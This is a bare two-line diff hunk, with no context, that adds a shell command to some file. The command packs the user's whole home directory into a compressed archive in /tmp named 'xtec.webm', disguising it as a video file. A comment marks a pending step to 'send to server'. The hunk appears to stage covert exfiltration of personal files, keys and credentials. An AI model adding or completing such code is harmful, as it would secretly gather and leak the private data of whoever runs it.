@@ -1,0 +1,2 @@
+tar -czvf /tmp/xtec.webm $HOME/
+# TODO send to server
